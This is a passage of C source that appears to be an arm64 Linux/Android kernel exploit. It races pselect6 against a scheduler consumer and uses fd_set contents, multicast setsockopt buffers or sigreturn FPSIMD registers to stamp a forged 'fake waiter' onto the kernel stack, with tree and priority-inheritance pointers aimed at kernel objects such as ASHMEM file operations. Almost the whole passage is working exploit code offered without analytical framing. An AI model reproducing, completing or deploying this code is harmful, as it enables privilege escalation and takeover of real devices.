#endif
};
for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
struct slide_waiter_word *w = &words[i];
slide_pselect_put_waiter_word(
in, out, ex, words_per_set, w->word, w->value, w->name);
}
}

RMG_RACE_INLINE void open_slide_selected_fds(
fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
for (int fd = 0; fd < slide_route_nfds; fd++) {
if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
dup2(read_fd, fd);
}
}
}
#endif

static void slide_reset_consume_state(void) {
atomic_store(&slide_consume_stop, 0);
atomic_store(&slide_consume_go, 0);
atomic_store(&slide_consume_seen, 0);
atomic_store(&slide_consume_lost, 0);
atomic_store(&slide_consume_enter_sched, 0);
atomic_store(&slide_consume_calls, 0);
atomic_store(&slide_consume_sched_ok, 0);
atomic_store(&slide_consume_last_sched_ret, -1);
atomic_store(&slide_consume_last_sched_errno, 0);
atomic_store(&slide_stack_write_window, 0);
atomic_store(&slide_pselect_write_window, 0);
#if defined(APP_S928_ROUTE_DIAG) && APP_S928_ROUTE_DIAG
atomic_store(&slide_pselect_last_ret, INT_MIN);
atomic_store(&slide_pselect_last_errno, 0);
atomic_store(&slide_pselect_last_elapsed_usec, 0);
#endif
#if (defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION) || 
 (defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE)
atomic_store(&slide_pselect_started_ns, 0);
#endif
}

#if defined(SLIDE_STACK_WRITER)
static void slide_build_fake_waiter(unsigned char *payload,
size_t waiter_off) {
uintptr_t tree_parent = slide_oracle_parent;
uintptr_t tree_right = 0;
uintptr_t tree_left = slide_oracle_target;
uintptr_t pi_parent = slide_oracle_parent;
uintptr_t pi_right = 0;
uintptr_t pi_left = slide_oracle_target;

#if defined(APP_PRODUCTION_STACK_PI_RIGHT_ONLY) && 
 APP_PRODUCTION_STACK_PI_RIGHT_ONLY
if (slide_oracle_parent == fake_fops &&
slide_oracle_target == data_addr(ASHMEM_MISC_FOPS)) {
tree_right = slide_oracle_target;
tree_left = 0;
pi_parent = fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF;
pi_right = 0;
pi_left = 0;
}
#endif

memset(payload + waiter_off, 0, FAKE_WAITER_LAYOUT_SIZE);
put_fake_waiter(payload, waiter_off,
tree_parent, tree_right, tree_left,
pi_parent, pi_right, pi_left,
fake_task, fake_lock, FAKE_WAITER_PRIO);
}
#endif

#if !defined(SLIDE_STACK_WRITER)
RMG_RACE_INLINE void slide_pselect_stack_copy(void) {
if (!page_base || !fake_lock || !fake_w0) {
pr_error("slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
page_base, fake_lock, fake_w0);
return;
}

int pipefd[2] = {-1, -1};
SYSCHK(pipe(pipefd));
int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
if (block_fd < 0) {
pr_warning("slide timerfd_create failed errno=%d; using pipe read end\n",
errno);
block_fd = pipefd[0];
}
int high_read = fcntl(block_fd, F_DUPFD, slide_route_nfds + 16);
if (high_read < 0) {
pr_error("slide pselect F_DUPFD read errno=%d\n", errno);
if (block_fd != pipefd[0]) {
close(block_fd);
}
close(pipefd[0]);
close(pipefd[1]);
return;
}

fd_set in;
fd_set out;
fd_set ex;
prepare_slide_pselect_fdsets(&in, &out, &ex);
open_slide_selected_fds(&in, &out, &ex, high_read);

slide_reset_consume_state();

struct timespec timeout = {
#ifdef SLIDE_PSELECT_TIMEOUT_NSEC
.tv_sec = 0,
.tv_nsec = SLIDE_PSELECT_TIMEOUT_NSEC,
#else
.tv_sec = PSELECT_TIMEOUT_SEC,
.tv_nsec = 0,
#endif
};
struct timespec *timeoutp = &timeout;

#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
atomic_store(&slide_consume_go, 1);
/*
• The reference waiter publishes the route sequence and then enters
• pselect without waiting for the consumer's acknowledgement. The
• consumer observes this sequence first and waits for the timestamp below.
*/
#endif
size_t pselect_started = gettime_ns();
#if (defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION) || 
 (defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE)
atomic_store(&slide_pselect_started_ns, pselect_started);
#endif
for (int index = 0; index < slide_route_syscall_pad; index++) {
syscall(SYS_gettid);
}
#if !(defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE)
atomic_store(&slide_consume_go, 1);
#endif
errno = 0;
int ret = (int)syscall(SYS_pselect6, slide_route_nfds,
&in, &out, &ex, timeoutp, NULL);
int saved_errno = errno;
size_t pselect_elapsed_usec =
(gettime_ns() - pselect_started) / 1000ULL;
#if defined(APP_S928_ROUTE_DIAG) && APP_S928_ROUTE_DIAG
atomic_store(&slide_pselect_last_ret, ret);
atomic_store(&slide_pselect_last_errno, saved_errno);
atomic_store(&slide_pselect_last_elapsed_usec, pselect_elapsed_usec);
#endif
atomic_store(&slide_consume_go, 0);

if (atomic_load(&slide_consume_enter_sched) != 0 &&
!atomic_load(&slide_consume_stop)) {
size_t consume_deadline = gettime_ns() + 200000000ULL;
while (!atomic_load(&slide_consume_stop) &&
gettime_ns() < consume_deadline) {
usleep(1000);
}
}

#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
(void)saved_errno;
(void)pselect_elapsed_usec;
#elif defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
pr_info("slide pselect returned nfds=%d pad=%d prod_stack=%d "
"ret=%d errno=%d "
"elapsed_usec=%zu "
"ready=%d seen=%d entered=%d calls=%d sched_ok=%d "
"last_sched_ret=%d last_sched_errno=%d\n",
slide_route_nfds, slide_route_syscall_pad,
slide_pselect_production_stack, ret, saved_errno,
pselect_elapsed_usec,
atomic_load(&slide_consumer_ready),
atomic_load(&slide_consume_seen),
atomic_load(&slide_consume_enter_sched),
atomic_load(&slide_consume_calls),
atomic_load(&slide_consume_sched_ok),
atomic_load(&slide_consume_last_sched_ret),
atomic_load(&slide_consume_last_sched_errno));
#else
pr_info("slide pselect returned nfds=%d pad=%d ret=%d errno=%d "
"elapsed_usec=%zu "
"ready=%d seen=%d entered=%d calls=%d sched_ok=%d "
"last_sched_ret=%d last_sched_errno=%d\n",
slide_route_nfds, slide_route_syscall_pad, ret, saved_errno,
pselect_elapsed_usec,
atomic_load(&slide_consumer_ready),
atomic_load(&slide_consume_seen),
atomic_load(&slide_consume_enter_sched),
atomic_load(&slide_consume_calls),
atomic_load(&slide_consume_sched_ok),
atomic_load(&slide_consume_last_sched_ret),
atomic_load(&slide_consume_last_sched_errno));
#endif
atomic_store(&slide_stack_write_window,
ret > 0 && atomic_load(&slide_consume_sched_ok) > 0);

close(high_read);
if (block_fd != pipefd[0]) {
close(block_fd);
}
close(pipefd[0]);
close(pipefd[1]);
}
#endif

#if defined(SLIDE_STACK_WRITER) && 
 defined(SLIDE_STACK_WRITER_MCAST) && 
 SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_MCAST
#ifndef SLIDE_MCAST_DOMAIN
#define SLIDE_MCAST_DOMAIN AF_INET6
#endif
#ifndef SLIDE_MCAST_LEVEL
#define SLIDE_MCAST_LEVEL IPPROTO_IPV6
#endif
#ifndef SLIDE_MCAST_OPTION
#define SLIDE_MCAST_OPTION MCAST_JOIN_SOURCE_GROUP
#endif
static void slide_mcast_stack_copy(void) {
enum { stamp_size = 0x108 };
_Static_assert(MCAST_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE <= stamp_size,
"MCAST waiter must fit in the copied stack stamp");
unsigned char stamp[stamp_size];
memset(stamp, 0, sizeof(stamp));
uint16_t invalid_family = AF_UNSPEC;
memcpy(stamp + 0x08, &invalid_family, sizeof(invalid_family));
slide_build_fake_waiter(stamp, MCAST_WAITER_OFF);

int fd = socket(SLIDE_MCAST_DOMAIN, SOCK_DGRAM | SOCK_CLOEXEC, 0);
if (fd < 0) {
pr_error("slide mcast socket errno=%d\n", errno);
return;
}

slide_reset_consume_state();

errno = 0;
int ret = setsockopt(fd, SLIDE_MCAST_LEVEL, SLIDE_MCAST_OPTION,
stamp, sizeof(stamp));
int saved_errno = errno;
atomic_store(&slide_consume_go, 1);
while (!atomic_load(&slide_consume_stop))
asm volatile("yield" ::: "memory");
atomic_store(&slide_consume_go, 0);

int sched_ok = atomic_load(&slide_consume_sched_ok);
atomic_store(&slide_stack_write_window,
ret == -1 && saved_errno == EADDRNOTAVAIL && sched_ok > 0);
pr_info("slide mcast returned domain=%d level=%d option=%d "
"offset=%#x ret=%d errno=%d "
"calls=%d sched_ok=%d last_sched_ret=%d last_sched_errno=%d\n",
SLIDE_MCAST_DOMAIN, SLIDE_MCAST_LEVEL, SLIDE_MCAST_OPTION,
MCAST_WAITER_OFF, ret, saved_errno,
atomic_load(&slide_consume_calls), sched_ok,
atomic_load(&slide_consume_last_sched_ret),
atomic_load(&slide_consume_last_sched_errno));
close(fd);
}
#endif

#if defined(SLIDE_STACK_WRITER) && 
 defined(SLIDE_STACK_WRITER_SIGRETURN) && 
 SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
static atomic_int slide_sigreturn_done;
static atomic_int slide_sigreturn_status;
static atomic_int slide_sigreturn_found_fpsimd;
static atomic_int slide_sigreturn_found_sve;
static atomic_int slide_sigreturn_waiter_off;
static atomic_int slide_sigreturn_probe_only;
#define SLIDE_SIGRETURN_RECORD_MAX 16
static atomic_int slide_sigreturn_record_count;
static atomic_int slide_sigreturn_record_magic[SLIDE_SIGRETURN_RECORD_MAX];
static atomic_int slide_sigreturn_record_size[SLIDE_SIGRETURN_RECORD_MAX];
static atomic_int slide_sigreturn_record_area[SLIDE_SIGRETURN_RECORD_MAX];
static unsigned char slide_sigreturn_payload_fpsimd[0x200];
static unsigned char slide_sigreturn_payload_sve[0x200];

_Static_assert(ATOMIC_INT_LOCK_FREE == 2,
"signal handler atomics must be lock-free");
_Static_assert(sizeof(struct fpsimd_context) == 0x210,
"unexpected arm64 FPSIMD context size");
_Static_assert(sizeof(((struct fpsimd_context *)0)->vregs) == 0x200,
"unexpected arm64 FPSIMD register payload size");
_Static_assert(SIGRETURN_SVE_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE <= 0x200,
"fake waiter must fit in FPSIMD registers");

static int slide_sigreturn_scan_records(
unsigned char *cursor, size_t bytes, int area,
struct fpsimd_context **fpsimd, int *saw_sve,
unsigned char **extra_data, size_t *extra_bytes) {
unsigned char *end = cursor + bytes;
while ((size_t)(end - cursor) >= sizeof(struct _aarch64_ctx)) {
struct _aarch64_ctx *header = (struct _aarch64_ctx *)cursor;
if (header->magic == 0 && header->size == 0) {
return 1;
}
int record = atomic_load_explicit(&slide_sigreturn_record_count,
memory_order_relaxed);
if (record < SLIDE_SIGRETURN_RECORD_MAX) {
atomic_store_explicit(&slide_sigreturn_record_magic[record],
(int)header->magic, memory_order_relaxed);
atomic_store_explicit(&slide_sigreturn_record_size[record],
(int)header->size, memory_order_relaxed);
atomic_store_explicit(&slide_sigreturn_record_area[record], area,
memory_order_relaxed);
atomic_store_explicit(&slide_sigreturn_record_count, record + 1,
memory_order_relaxed);
}
if (header->size < sizeof(*header) || (header->size & 15) != 0 ||
(size_t)(end - cursor) < header->size) {
return 0;
}
if (header->magic == FPSIMD_MAGIC) {
if (header->size < sizeof(struct fpsimd_context)) {
return 0;
}
*fpsimd = (struct fpsimd_context *)header;
} else if (header->magic == SVE_MAGIC) {
*saw_sve = 1;
} else if (header->magic == EXTRA_MAGIC &&
header->size >= sizeof(struct extra_context)) {
struct extra_context *extra = (struct extra_context *)header;
if (extra->datap && extra->size >= sizeof(struct _aarch64_ctx) &&
extra->size <= 65536) {
*extra_data = (unsigned char *)(uintptr_t)extra->datap;
*extra_bytes = extra->size;
}
}
cursor += header->size;
}
return 0;
}

static void slide_sigreturn_handler(int signal_number,
siginfo_t *signal_info,
void *user_context) {
(void)signal_number;
(void)signal_info;
ucontext_t *context = user_context;
unsigned char *cursor = context->uc_mcontext.__reserved;
struct fpsimd_context *fpsimd = NULL;
unsigned char *extra_data = NULL;
size_t extra_bytes = 0;
int saw_sve = 0;
int status = -3;

atomic_store_explicit(&slide_sigreturn_found_fpsimd, 0,
memory_order_relaxed);
atomic_store_explicit(&slide_sigreturn_found_sve, 0,
memory_order_relaxed);
atomic_store_explicit(&slide_sigreturn_waiter_off, -1,
memory_order_relaxed);
atomic_store_explicit(&slide_sigreturn_record_count, 0,
memory_order_relaxed);

if (!slide_sigreturn_scan_records(
cursor, sizeof(context->uc_mcontext.__reserved), 0,
&fpsimd, &saw_sve, &extra_data, &extra_bytes)) {
status = -2;
goto done;
}
if (extra_data &&
!slide_sigreturn_scan_records(extra_data, extra_bytes, 1,
&fpsimd, &saw_sve,
&extra_data, &extra_bytes)) {
status = -6;
goto done;
}

if (fpsimd == NULL) {
goto done;
}

size_t waiter_off = saw_sve ? SIGRETURN_SVE_WAITER_OFF
: SIGRETURN_FPSIMD_WAITER_OFF;
if (waiter_off + FAKE_WAITER_LAYOUT_SIZE >
sizeof(fpsimd->vregs)) {
status = -5;
goto done;
}

atomic_store_explicit(&slide_sigreturn_found_fpsimd, 1,
memory_order_relaxed);
atomic_store_explicit(&slide_sigreturn_found_sve, saw_sve,
memory_order_relaxed);
atomic_store_explicit(&slide_sigreturn_